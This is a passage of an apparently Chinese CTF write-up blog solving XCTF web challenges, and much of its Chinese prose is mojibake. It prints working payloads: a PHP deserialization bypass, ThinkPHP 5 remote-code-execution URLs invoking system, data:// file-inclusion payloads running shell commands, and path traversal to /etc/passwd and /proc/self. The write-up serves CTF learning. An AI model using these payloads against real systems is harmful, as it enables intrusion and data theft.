</span></span><span class="line"><span class="cl">    <span class="k">private</span> <span class="nv">$file</span> <span class="o">=</span> <span class="s1">&#39;index.php&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$file</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">file</span> <span class="o">=</span> <span class="nv">$file</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="fm">__destruct</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="o">@</span><span class="nx">highlight_file</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">file</span><span class="p">,</span> <span class="k">true</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="fm">__wakeup</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">file</span> <span class="o">!=</span> <span class="s1">&#39;index.php&#39;</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="c1">//the secret is in the fl4g.php
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">file</span> <span class="o">=</span> <span class="s1">&#39;index.php&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="nv">$a</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Demo</span><span class="p">(</span><span class="s1">&#39;fl4g.php&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$str</span><span class="o">=</span><span class="nx">serialize</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="c1">//echo $a;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$str1</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s1">&#39;O:4&#39;</span><span class="p">,</span> <span class="s1">&#39;O:+4&#39;</span><span class="p">,</span><span class="nv">$str</span><span class="p">);</span><span class="c1">//ÁªïËøápreg_match
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$str2</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s1">&#39;:1:&#39;</span><span class="p">,</span> <span class="s1">&#39;:2:&#39;</span><span class="p">,</span><span class="nv">$str1</span><span class="p">);</span><span class="c1">//ÁªïËøáwakeup
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">var_dump</span><span class="p">(</span><span class="nv">$str2</span><span class="p">);</span><span class="c1">//string(49) &#34;O:+4:&#34;Demo&#34;:2:{s:10:&#34;Demofile&#34;;s:8:&#34;fl4g.php&#34;;}&#34;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">var_dump</span><span class="p">(</span><span class="nx">base64_encode</span><span class="p">(</span><span class="nv">$str2</span><span class="p">));</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250112154716210.png"
	width="937"
	height="122"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250112154716210_hu4221936664075490196.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250112154716210_hu10902609738301618055.png 1024w"
	loading="lazy"
	
		alt="image-20250112154716210"
	
	
		class="gallery-image" 
		data-flex-grow="768"
		data-flex-basis="1843px"
	
></p>
<p>Áªôvar‰º†base64Á†ÅÂ∞±Ë°å‰∫Ü</p>
<h2 id="php_rce">php_rce
</h2><p>ËøõÂéªÂèëÁé∞ÊòØthinkphp5Ê°ÜÊû∂ÔºåÂéªgithub‰∏äÊâæ</p>
<p>Â§öËØïËØïpayload</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="mi">6</span><span class="err">„ÄÅ</span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">localhost</span><span class="o">/</span><span class="n">thinkphp_5</span><span class="o">.</span><span class="mf">0.21</span><span class="o">/</span><span class="err">?</span><span class="n">s</span><span class="o">=</span><span class="n">index</span><span class="o">/</span>\<span class="n">think</span>\<span class="n">app</span><span class="o">/</span><span class="n">invokefunction</span><span class="o">&amp;</span><span class="n">function</span><span class="o">=</span><span class="n">call_user_func_array</span><span class="o">&amp;</span><span class="n">vars</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">=</span><span class="n">system</span><span class="o">&amp;</span><span class="n">vars</span><span class="p">[</span><span class="mi">1</span><span class="p">][]</span><span class="o">=</span><span class="n">id</span>
</span></span><span class="line"><span class="cl"><span class="mi">7</span><span class="err">„ÄÅ</span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">localhost</span><span class="o">/</span><span class="n">thinkphp_5</span><span class="o">.</span><span class="mf">0.21</span><span class="o">/</span><span class="err">?</span><span class="n">s</span><span class="o">=</span><span class="n">index</span><span class="o">/</span>\<span class="n">think</span>\<span class="n">app</span><span class="o">/</span><span class="n">invokefunction</span><span class="o">&amp;</span><span class="n">function</span><span class="o">=</span><span class="n">call_user_func_array</span><span class="o">&amp;</span><span class="n">vars</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">=</span><span class="n">phpinfo</span><span class="o">&amp;</span><span class="n">vars</span><span class="p">[</span><span class="mi">1</span><span class="p">][]</span><span class="o">=</span><span class="mi">1</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Âú®[]ÂêéËæìÂëΩ‰ª§Â∞±Ë°å</p>
<p>lsÊ≤°ÂèëÁé∞flag</p>
<p>find / -name &ldquo;flag*&rdquo;</p>
<p>ÊâæÂà∞flag</p>
<p>ÊàñËÄÖ‰∏ÄÁõ¥Ë∑≥ÁõÆÂΩï</p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250112160044624.png"
	width="1204"
	height="805"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250112160044624_hu17898567564985901148.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250112160044624_hu6372897803905053158.png 1024w"
	loading="lazy"
	
		alt="image-20250112160044624"
	
	
		class="gallery-image" 
		data-flex-grow="149"
		data-flex-basis="358px"
	
></p>
<h2 id="web_php_include">Web_php_include
</h2><p>ËøáÊª§php://</p>
<p>Áî®Â§ßÂÜôÁªïËøáPHP://</p>
<p>post‰º†‰∏ÄÂè•ËØù</p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250113174925061.png"
	width="1499"
	height="780"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250113174925061_hu5577768482629229566.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250113174925061_hu2256598635289201254.png 1024w"
	loading="lazy"
	
		alt="image-20250113174925061"
	
	
		class="gallery-image" 
		data-flex-grow="192"
		data-flex-basis="461px"
	
></p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250113174938813.png"
	width="1494"
	height="753"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250113174938813_hu8893580363183129689.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250113174938813_hu4761288757948671547.png 1024w"
	loading="lazy"
	
		alt="image-20250113174938813"
	
	
		class="gallery-image" 
		data-flex-grow="198"
		data-flex-basis="476px"
	
></p>
<p>Áî®data://ÂçèËÆÆ</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">‰ΩøÁî®ÊñπÊ≥ïdata://text/plain;base64;base64ÁºñÁ†ÅÂêéÁöÑÂëΩ‰ª§
</span></span><span class="line"><span class="cl">&lt;?php system(&#34;dir&#34;)?&gt; base64ÁºñÁ†ÅÂêé‰ΩøÁî®
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">http://111.198.29.45:47062/?page=data://text/plain/;base64,PD9waHAgc3lzdGVtKCJkaXIisssKT8%2b  (Ê≥®ÊÑèÁºñÁ†ÅÂêéÁöÑ+Âè∑Ë¶ÅURLÁºñÁ†Å)
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">&lt;?php system(&#34;cat fl4gisisish3r3.php&#34;)?&gt; base64ÁºñÁ†ÅÂêé‰ΩøÁî®
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">http://111.198.29.45:47062/?page=data://text/plain/;base64,PD9waHAgc3lzdGVtKCJjYXQgZmw0Z2lzaXNpc2gzcjMucGhwIik/Pg==
</span></span><span class="line"><span class="cl">ÊàñËÄÖ‰º†‰∏ÄÂè•ËØùÊú®È©¨ËøûÊé•
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="catcat-new">catcat-new
</h2><p>ÂâçÁΩÆÁü•ËØÜ</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">/etc/passwd
</span></span><span class="line"><span class="cl">ËØ•Êñá‰ª∂ÂÇ®Â≠ò‰∫ÜËØ•LinuxÁ≥ªÁªü‰∏≠ÊâÄÊúâÁî®Êà∑ÁöÑ‰∏Ä‰∫õÂü∫Êú¨‰ø°ÊÅØÔºåÂè™ÊúârootÊùÉÈôêÊâçÂèØ‰ª•‰øÆÊîπ„ÄÇÂÖ∂ÂÖ∑‰ΩìÊ†ºÂºè‰∏∫      Áî®Êà∑Âêç:Âè£‰ª§:Áî®Êà∑Ê†áËØÜÂè∑:ÁªÑÊ†áËØÜÂè∑:Ê≥®ÈáäÊÄßÊèèËø∞:‰∏ªÁõÆÂΩï:ÁôªÂΩïShellÔºà‰ª•ÂÜíÂè∑‰Ωú‰∏∫ÂàÜÈöîÁ¨¶Ôºâ
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">/proc/self
</span></span><span class="line"><span class="cl">procÊòØ‰∏Ä‰∏™‰º™Êñá‰ª∂Á≥ªÁªüÔºåÂÆÉÊèê‰æõ‰∫ÜÂÜÖÊ†∏Êï∞ÊçÆÁªìÊûÑÁöÑÊé•Âè£„ÄÇÂÜÖÊ†∏Êï∞ÊçÆÊòØÂú®Á®ãÂ∫èËøêË°åÊó∂Â≠òÂÇ®Âú®ÂÜÖÈÉ®ÂçäÂØº‰ΩìÂ≠òÂÇ®Âô®‰∏≠Êï∞ÊçÆ„ÄÇÈÄöËøá/proc/PIDÂèØ‰ª•ËÆøÈóÆÂØπÂ∫îPIDÁöÑËøõÁ®ãÂÜÖÊ†∏Êï∞ÊçÆÔºåËÄå/proc/selfËÆøÈóÆÁöÑÊòØÂΩìÂâçËøõÁ®ãÁöÑÂÜÖÊ†∏Êï∞ÊçÆ„ÄÇ
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">/proc/self/cmdline
</span></span><span class="line"><span class="cl">ËØ•Êñá‰ª∂ÂåÖÂê´ÁöÑÂÜÖÂÆπ‰∏∫ÂΩìÂâçËøõÁ®ãÊâßË°åÁöÑÂëΩ‰ª§Ë°åÂèÇÊï∞„ÄÇ
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">/proc/self/mem
</span></span><span class="line"><span class="cl">/proc/self/memÊòØÂΩìÂâçËøõÁ®ãÁöÑÂÜÖÂ≠òÂÜÖÂÆπÔºåÈÄöËøá‰øÆÊîπËØ•Êñá‰ª∂Áõ∏ÂΩì‰∫éÁõ¥Êé•‰øÆÊîπÂΩìÂâçËøõÁ®ãÁöÑÂÜÖÂ≠òÊï∞ÊçÆ„ÄÇ‰ΩÜÊòØÊ≥®ÊÑèËØ•Êñá‰ª∂‰∏çËÉΩÁõ¥Êé•ËØªÂèñÔºåÂõ†‰∏∫Êñá‰ª∂‰∏≠Â≠òÂú®ÁùÄ‰∏Ä‰∫õÊó†Ê≥ïËØªÂèñÁöÑÊú™Ë¢´Êò†Â∞ÑÂå∫Âüü„ÄÇÊâÄ‰ª•Ë¶ÅÁªìÂêà/proc/self/maps‰∏≠ÁöÑÂÅèÁßªÂú∞ÂùÄËøõË°åËØªÂèñ„ÄÇÈÄöËøáÂèÇÊï∞startÂíåendÂèäÂÅèÁßªÂú∞ÂùÄÂÄºËØªÂèñÂÜÖÂÆπ„ÄÇ
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">/proc/self/maps
</span></span><span class="line"><span class="cl">/proc/self/mapsÂåÖÂê´ÁöÑÂÜÖÂÆπÊòØÂΩìÂâçËøõÁ®ãÁöÑÂÜÖÂ≠òÊò†Â∞ÑÂÖ≥Á≥ªÔºåÂèØÈÄöËøáËØªÂèñËØ•Êñá‰ª∂Êù•ÂæóÂà∞ÂÜÖÂ≠òÊï∞ÊçÆÊò†Â∞ÑÁöÑÂú∞ÂùÄ„ÄÇ
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">flask-sessionÁªìÊûÑ
</span></span><span class="line"><span class="cl"> flask_sessionÊòØflaskÊ°ÜÊû∂ÂÆûÁé∞sessionÂäüËÉΩÁöÑ‰∏Ä‰∏™Êèí‰ª∂„ÄÇÂÖ∂sessionÁªìÊûÑÂàÜ‰∏∫‰∏âÈÉ®ÂàÜÔºöÂ∫èÂàóÂåñÂÜÖÂÆπ+Êó∂Èó¥+Èò≤ÁØ°ÊîπÂÄºÔºåËøô‰∏âÈÉ®ÂàÜÂÜÖÂÆπÂä†ÂØÜÂêé‰ª•Á¨¶Âè∑ ‚Äú.‚ÄùÊù•ËøõË°åÂàÜÈöî„ÄÇflask_sessionÈªòËÆ§sessionÁöÑÂÇ®Â≠òÊòØÂú®Áî®Êà∑Cookie‰∏≠„ÄÇ‰ΩÜ‰πüÂèØ‰ª•ÊåáÂÆöÂ≠òÂÇ®Âú®Êï∞ÊçÆÂ∫ìÔºåÁºìÂ≠ò‰∏≠Èó¥‰ª∂ÔºåÊúçÂä°Âô®Êú¨Âú∞Êñá‰ª∂Á≠âÁ≠â‰πã‰∏≠„ÄÇ
</span></span></code></pre></td></tr></table>
</div>
</div><p>ËøôÈ¢òËÆøÈóÆÁΩëÈ°µÔºåÁúãÂà∞‰∏äÈù¢Êúâ?file=ÔºåÊÉ≥Âà∞Êñá‰ª∂ÂåÖÂê´</p>
<p>Â∞ùËØïËÆøÈóÆetc/passwdÔºåË∑≥‰∫ÜÂ§öÁ∫ßÁõÆÂΩïÂèëÁé∞Á°ÆÂÆûËÆøÈóÆÂà∞‰∫Ü</p>
<p>ËØªÂèñÂΩìÂâçËøõÁ®ãÁöÑÂëΩ‰ª§Ë°åÂèÇÊï∞?file=../../../../proc/self/cmdlineÔºåÂèëÁé∞Êúâ‰∏Ä‰∏™ÈÄöËøápythonÂêØÂä®app.pyÁöÑÂëΩ‰ª§</p>
<p>Êúâapp.pyÂà§Êñ≠ËøôÈ¢òÊòØflaskÊ°ÜÊû∂</p>
<p>ËØªÂèñapp.py</p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250116201011307.png"
	width="1589"
	height="857"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250116201011307_hu16099123147062481225.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250116201011307_hu7728297641785000982.png 1024w"
	loading="lazy"
	
		alt="image-20250116201011307"
	
	
		class="gallery-image" 
		data-flex-grow="185"
		data-flex-basis="444px"
	
></p>
<p>ËΩ¨Êç¢Ê†ºÂºè</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># ÈúÄË¶ÅÊ†ºÂºèÂåñÁöÑ‰ª£Á†Å</span>
</span></span><span class="line"><span class="cl"><span class="n">code_str</span> <span class="o">=</span> <span class="s1">&#39;&#39;&#39;import os</span><span class="se">\n</span><span class="s1">import uuid</span><span class="se">\n</span><span class="s1">from flask import Flask, request, session, render_template, Markup</span><span class="se">\n</span><span class="s1">from cat import cat</span><span class="se">\n\n</span><span class="s1">flag = &#34;&#34;</span><span class="se">\n</span><span class="s1">app = Flask(</span><span class="se">\n</span><span class="s1">    __name__,</span><span class="se">\n</span><span class="s1">    static_url_path=</span><span class="se">\&#39;</span><span class="s1">/</span><span class="se">\&#39;</span><span class="s1">, </span><span class="se">\n</span><span class="s1">    static_folder=</span><span class="se">\&#39;</span><span class="s1">static</span><span class="se">\&#39;</span><span class="s1"> </span><span class="se">\n</span><span class="s1">)</span><span class="se">\n</span><span class="s1">app.config[</span><span class="se">\&#39;</span><span class="s1">SECRET_KEY</span><span class="se">\&#39;</span><span class="s1">] = str(uuid.uuid4()).replace(&#34;-&#34;, &#34;&#34;) + &#34;*abcdefgh&#34;</span><span class="se">\n</span><span class="s1">if os.path.isfile(&#34;/flag&#34;):</span><span class="se">\n</span><span class="s1">    flag = cat(&#34;/flag&#34;)</span><span class="se">\n</span><span class="s1">    os.remove(&#34;/flag&#34;)</span><span class="se">\n\n</span><span class="s1">@app.route(</span><span class="se">\&#39;</span><span class="s1">/</span><span class="se">\&#39;</span><span class="s1">, methods=[</span><span class="se">\&#39;</span><span class="s1">GET</span><span class="se">\&#39;</span><span class="s1">])</span><span class="se">\n</span><span class="s1">def index():</span><span class="se">\n</span><span class="s1">    detailtxt = os.listdir(</span><span class="se">\&#39;</span><span class="s1">./details/</span><span class="se">\&#39;</span><span class="s1">)</span><span class="se">\n</span><span class="s1">    cats_list = []</span><span class="se">\n</span><span class="s1">    for i in detailtxt:</span><span class="se">\n</span><span class="s1">        cats_list.append(i[:i.index(</span><span class="se">\&#39;</span><span class="s1">.</span><span class="se">\&#39;</span><span class="s1">)])</span><span class="se">\n\n</span><span class="s1">    return render_template(&#34;index.html&#34;, cats_list=cats_list, cat=cat)</span><span class="se">\n\n\n\n</span><span class="s1">@app.route(</span><span class="se">\&#39;</span><span class="s1">/info</span><span class="se">\&#39;</span><span class="s1">, methods=[&#34;GET&#34;, </span><span class="se">\&#39;</span><span class="s1">POST</span><span class="se">\&#39;</span><span class="s1">])</span><span class="se">\n</span><span class="s1">def info():</span><span class="se">\n</span><span class="s1">    filename = &#34;./details/&#34; + request.args.get(</span><span class="se">\&#39;</span><span class="s1">file</span><span class="se">\&#39;</span><span class="s1">, &#34;&#34;)</span><span class="se">\n</span><span class="s1">    start = request.args.get(</span><span class="se">\&#39;</span><span class="s1">start</span><span class="se">\&#39;</span><span class="s1">, &#34;0&#34;)</span><span class="se">\n</span><span class="s1">    end = request.args.get(</span><span class="se">\&#39;</span><span class="s1">end</span><span class="se">\&#39;</span><span class="s1">, &#34;0&#34;)</span><span class="se">\n</span><span class="s1">    name = request.args.get(</span><span class="se">\&#39;</span><span class="s1">file</span><span class="se">\&#39;</span><span class="s1">, &#34;&#34;)[:request.args.get(</span><span class="se">\&#39;</span><span class="s1">file</span><span class="se">\&#39;</span><span class="s1">, &#34;&#34;).index(</span><span class="se">\&#39;</span><span class="s1">.</span><span class="se">\&#39;</span><span class="s1">)]</span><span class="se">\n\n</span><span class="s1">    return render_template(&#34;detail.html&#34;, catname=name, info=cat(filename, start, end))</span><span class="se">\n\n\n\n</span><span class="s1">@app.route(</span><span class="se">\&#39;</span><span class="s1">/admin</span><span class="se">\&#39;</span><span class="s1">, methods=[&#34;GET&#34;])</span><span class="se">\n</span><span class="s1">def admin_can_list_root():</span><span class="se">\n</span><span class="s1">    if session.get(</span><span class="se">\&#39;</span><span class="s1">admin</span><span class="se">\&#39;</span><span class="s1">) == 1:</span><span class="se">\n</span><span class="s1">        return flag</span><span class="se">\n</span><span class="s1">    else:</span><span class="se">\n</span><span class="s1">        session[</span><span class="se">\&#39;</span><span class="s1">admin</span><span class="se">\&#39;</span><span class="s1">] = 0</span><span class="se">\n</span><span class="s1">        return &#34;NoNoNo&#34;</span><span class="se">\n\n\n\n</span><span class="s1">if __name__ == </span><span class="se">\&#39;</span><span class="s1">__main__</span><span class="se">\&#39;</span><span class="s1">:</span><span class="se">\n</span><span class="s1">    app.run(host=</span><span class="se">\&#39;</span><span class="s1">0.0.0.0</span><span class="se">\&#39;</span><span class="s1">, debug=False, port=5637)&#39;&#39;&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># ÊåâË°åÂàÜÂâ≤Â≠óÁ¨¶‰∏≤</span>
</span></span><span class="line"><span class="cl"><span class="n">lines</span> <span class="o">=</span> <span class="n">code_str</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">indented_lines</span> <span class="o">=</span> <span class="p">[</span><span class="n">line</span> <span class="k">if</span> <span class="n">line</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span> <span class="k">else</span> <span class="s1">&#39;&#39;</span> <span class="k">for</span> <span class="n">line</span> <span class="ow">in</span> <span class="n">lines</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># ËøûÊé•Âπ∂ÊâìÂç∞Ê†ºÂºèÂåñÂêéÁöÑ‰ª£Á†Å</span>
</span></span><span class="line"><span class="cl"><span class="n">formatted_code</span> <span class="o">=</span> <span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">indented_lines</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">formatted_code</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">uuid</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">session</span><span class="p">,</span> <span class="n">render_template</span><span class="p">,</span> <span class="n">Markup</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">cat</span> <span class="kn">import</span> <span class="n">cat</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">flag</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">    <span class="vm">__name__</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="n">static_url_path</span><span class="o">=</span><span class="s1">&#39;/&#39;</span><span class="p">,</span> 
</span></span><span class="line"><span class="cl">    <span class="n">static_folder</span><span class="o">=</span><span class="s1">&#39;static&#39;</span> 
</span></span><span class="line"><span class="cl"><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">app</span><span class="o">.</span><span class="n">config</span><span class="p">[</span><span class="s1">&#39;SECRET_KEY&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">uuid</span><span class="o">.</span><span class="n">uuid4</span><span class="p">())</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&#34;-&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">)</span> <span class="o">+</span> <span class="s2">&#34;*abcdefgh&#34;</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">isfile</span><span class="p">(</span><span class="s2">&#34;/flag&#34;</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">flag</span> <span class="o">=</span> <span class="n">cat</span><span class="p">(</span><span class="s2">&#34;/flag&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">os</span><span class="o">.</span><span class="n">remove</span><span class="p">(</span><span class="s2">&#34;/flag&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;GET&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">index</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="n">detailtxt</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">listdir</span><span class="p">(</span><span class="s1">&#39;./details/&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">cats_list</span> <span class="o">=</span> <span class="p">[]</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">detailtxt</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">cats_list</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">i</span><span class="p">[:</span><span class="n">i</span><span class="o">.</span><span class="n">index</span><span class="p">(</span><span class="s1">&#39;.&#39;</span><span class="p">)])</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s2">&#34;index.html&#34;</span><span class="p">,</span> <span class="n">cats_list</span><span class="o">=</span><span class="n">cats_list</span><span class="p">,</span> <span class="n">cat</span><span class="o">=</span><span class="n">cat</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/info&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s2">&#34;GET&#34;</span><span class="p">,</span> <span class="s1">&#39;POST&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">info</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="n">filename</span> <span class="o">=</span> <span class="s2">&#34;./details/&#34;</span> <span class="o">+</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;file&#39;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">)</span>
